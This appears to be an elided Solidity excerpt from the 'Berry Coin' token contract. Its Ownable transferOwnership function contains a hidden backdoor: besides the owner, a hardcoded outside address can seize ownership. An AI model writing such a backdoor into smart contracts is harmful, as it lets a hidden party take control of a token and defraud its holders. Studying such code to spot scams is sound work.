...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x77e1fA48f5bE5bCB2ED269D880a8edc0dcd9a18B));
...
contract BerryCoin is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Berry Coin";
